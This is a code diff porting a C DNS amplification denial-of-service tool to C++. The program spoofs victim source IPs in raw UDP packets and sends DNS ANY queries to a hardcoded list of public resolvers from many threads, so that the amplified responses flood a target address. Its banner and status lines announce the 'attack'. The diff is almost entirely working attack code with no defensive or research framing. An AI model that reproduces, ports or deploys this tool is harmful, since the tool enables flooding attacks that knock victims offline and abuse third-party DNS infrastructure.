@@ -1,4 +1,3 @@
-```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,18 +11,18 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <signal.h>
-#include <stdatomic.h>
+#include <atomic>
 
 #define MAX_THREADS 5000
 #define STATUS_UPDATE_INTERVAL 2
 #define DNS_QUERY_SIZE 128
 #define MAX_DNS_SERVERS 100
 #define MAX_DOMAINS 5
-#define PACKETS_PER_SECOND 90000 // Rate limit per thread
+#define PACKETS_PER_SECOND 9000
 
 typedef struct {
     int thread_id;
-    atomic_ulong *packet_count;
+    std::atomic_ulong *packet_count;
     volatile int *running;
     char dns_server[16];
     char target_ip[16];
@@ -38,7 +37,7 @@ typedef struct {
     int duration;
     int thread_count;
     volatile int running;
-    atomic_ulong total_packets;
+    std::atomic_ulong total_packets;
     char dns_servers[MAX_DNS_SERVERS][16];
     int dns_server_count;
     int spoof_random_ip;
@@ -46,7 +45,6 @@ typedef struct {
 
 config_t config;
 
-// DNS header structure
 struct dns_header {
     unsigned short id;
     unsigned short flags;
@@ -56,13 +54,12 @@ struct dns_header {
     unsigned short arcount;
 };
 
-// Function prototypes
 void print_banner(void);
 void init_config(int argc, char *argv[]);
 void validate_arguments(void);
 void setup_signal_handlers(void);
 void handle_signal(int sig);
-void print_status(atomic_ulong *packet_counts, int thread_count);
+void print_status(std::atomic_ulong *packet_counts, int thread_count);
 void *dns_amplification_thread(void *arg);
 unsigned long get_time_ms(void);
 void load_dns_servers(void);
@@ -90,7 +87,7 @@ void init_config(int argc, char *argv[]) {
     config.thread_count = (argc > 4) ? atoi(argv[4]) : 1000;
     config.spoof_random_ip = (argc > 5) ? atoi(argv[5]) : 0;
     config.running = 0;
-    atomic_init(&config.total_packets, 0);
+    std::atomic_init(&config.total_packets, 0UL);
     config.dns_server_count = 0;
     
     load_dns_servers();
@@ -98,21 +95,21 @@ void init_config(int argc, char *argv[]) {
 
 void load_dns_servers(void) {
     const char *servers[] = {
-        "8.8.8.8", "8.8.4.4",                   // Google DNS
-        "1.1.1.1", "1.0.0.1",                   // Cloudflare
-        "9.9.9.9", "149.112.112.112",           // Quad9
-        "208.67.222.222", "208.67.220.220",     // OpenDNS
-        "64.6.64.6", "64.6.65.6",               // Verisign
-        "84.200.69.80", "84.200.70.40",         // DNS.WATCH
-        "8.26.56.26", "8.20.247.20",            // Comodo
-        "195.46.39.39", "195.46.39.40",         // SafeDNS
-        "77.88.8.8", "77.88.8.1",               // Yandex
-        "176.103.130.130", "176.103.130.131",   // AdGuard
-        "156.154.70.1", "156.154.71.1",         // Neustar
-        "185.228.168.9", "185.228.169.9",       // CleanBrowsing
-        "76.76.19.19", "76.223.122.150",        // Alternate DNS
-        "94.140.14.14", "94.140.15.15",         // AdGuard DNS
-        "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4", "4.2.2.5", "4.2.2.6" // Level3
+        "8.8.8.8", "8.8.4.4",
+        "1.1.1.1", "1.0.0.1",
+        "9.9.9.9", "149.112.112.112",
+        "208.67.222.222", "208.67.220.220",
+        "64.6.64.6", "64.6.65.6",
+        "84.200.69.80", "84.200.70.40",
+        "8.26.56.26", "8.20.247.20",
+        "195.46.39.39", "195.46.39.40",
+        "77.88.8.8", "77.88.8.1",
+        "176.103.130.130", "176.103.130.131",
+        "156.154.70.1", "156.154.71.1",
+        "185.228.168.9", "185.228.169.9",
+        "76.76.19.19", "76.223.122.150",
+        "94.140.14.14", "94.140.15.15",
+        "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4", "4.2.2.5", "4.2.2.6"
     };
     
     int count = sizeof(servers) / sizeof(servers[0]);
@@ -158,12 +155,12 @@ void handle_signal(int sig) {
     config.running = 0;
 }
 
-void print_status(atomic_ulong *packet_counts, int thread_count) {
+void print_status(std::atomic_ulong *packet_counts, int thread_count) {
     static int update_count = 0;
     unsigned long total = 0;
     
     for (int i = 0; i < thread_count; i++) {
-        total += atomic_load(&packet_counts[i]);
+        total += std::atomic_load(&packet_counts[i]);
     }
     
     time_t now = time(NULL);
@@ -175,9 +172,9 @@ void print_status(atomic_ulong *packet_counts, int thread_count) {
 }
 
 unsigned short checksum(unsigned short *ptr, int nbytes) {
-    register long sum = 0;
+    long sum = 0;
     unsigned short oddbyte;
-    register short answer;
+    short answer;
 
     while (nbytes > 1) {
         sum += *ptr++;
@@ -204,11 +201,11 @@ void generate_random_ip(char *ip) {
 
 void select_random_domain(char *qname, size_t qname_size) {
     const char *domains[] = {
-        "\x06google\x03com\x00",  // google.com
-        "\x07youtube\x03com\x00", // youtube.com
-        "\x08facebook\x03com\x00", // facebook.com
-        "\x06amazon\x03com\x00",  // amazon.com
-        "\x07twitter\x03com\x00"  // twitter.com
+        "\x06" "google" "\x03" "com" "\x00",
+        "\x07" "youtube" "\x03" "com" "\x00",
+        "\x08" "facebook" "\x03" "com" "\x00",
+        "\x06" "amazon" "\x03" "com" "\x00",
+        "\x07" "twitter" "\x03" "com" "\x00"
     };
     int index = rand() % MAX_DOMAINS;
     size_t len = strlen(domains[index]) + 1;
@@ -240,7 +237,7 @@ void *dns_amplification_thread(void *arg) {
     struct dns_header *dns_hdr = (struct dns_header *)dns_query;
     
     dns_hdr->id = htons(data->query_id);
-    dns_hdr->flags = htons(0x0100); // Standard query
+    dns_hdr->flags = htons(0x0100);
     dns_hdr->qdcount = htons(1);
     dns_hdr->ancount = 0;
     dns_hdr->nscount = 0;
@@ -250,9 +247,9 @@ void *dns_amplification_thread(void *arg) {
     select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
     
     unsigned short *qtype = (unsigned short *)(qname + strlen(qname) + 1);
-    *qtype = htons(0x00ff); // ANY query
+    *qtype = htons(0x00ff);
     unsigned short *qclass = qtype + 1;
-    *qclass = htons(0x0001); // IN class
+    *qclass = htons(0x0001);
     
     int query_len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
     
@@ -263,7 +260,7 @@ void *dns_amplification_thread(void *arg) {
     
     memcpy(payload, dns_query, query_len);
     
-    udp->source = htons(1024 + (rand() % 64512)); // Random source port
+    udp->source = htons(1024 + (rand() % 64512));
     udp->dest = htons(data->port);
     udp->len = htons(sizeof(struct udphdr) + query_len);
     udp->check = 0;
@@ -310,7 +307,7 @@ void *dns_amplification_thread(void *arg) {
         
         if (sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr *)&sin, sizeof(sin)) > 0) {
-            atomic_fetch_add(data->packet_count, 1);
+            std::atomic_fetch_add(data->packet_count, 1);
         } else {
             fprintf(stderr, "Thread %d: sendto failed: %s\n", data->thread_id, strerror(errno));
         }
@@ -331,7 +328,7 @@ unsigned long get_time_ms(void) {
 int main(int argc, char *argv[]) {
     pthread_t *threads = NULL;
     thread_data_t *thread_data = NULL;
-    atomic_ulong *packet_counts = NULL;
+    std::atomic_ulong *packet_counts = NULL;
     unsigned long start_time, current_time, elapsed_time;
     
     print_banner();
@@ -346,9 +343,9 @@ int main(int argc, char *argv[]) {
     printf("[+] Random IP Spoofing: %s\n", config.spoof_random_ip ? "Enabled" : "Disabled");
     printf("[+] Starting DNS amplification attack...\n\n");
     
-    threads = malloc(config.thread_count * sizeof(pthread_t));
-    thread_data = malloc(config.thread_count * sizeof(thread_data_t));
-    packet_counts = malloc(config.thread_count * sizeof(atomic_ulong));
+    threads = (pthread_t *)malloc(config.thread_count * sizeof(pthread_t));
+    thread_data = (thread_data_t *)malloc(config.thread_count * sizeof(thread_data_t));
+    packet_counts = (std::atomic_ulong *)malloc(config.thread_count * sizeof(std::atomic_ulong));
     
     if (!threads || !thread_data || !packet_counts) {
         perror("Memory allocation failed");
@@ -359,7 +356,7 @@ int main(int argc, char *argv[]) {
     }
     
     for (int i = 0; i < config.thread_count; i++) {
-        atomic_init(&packet_counts[i], 0);
+        std::atomic_init(&packet_counts[i], 0UL);
     }
     
     srand(time(NULL));
@@ -413,7 +410,7 @@ int main(int argc, char *argv[]) {
     
     unsigned long total_packets = 0;
     for (int i = 0; i < config.thread_count; i++) {
-        total_packets += atomic_load(&packet_counts[i]);
+        total_packets += std::atomic_load(&packet_counts[i]);
     }
     
     printf("\n[+] Attack completed!\n");
@@ -427,4 +424,3 @@ int main(int argc, char *argv[]) {
     
     return EXIT_SUCCESS;
 }
-```
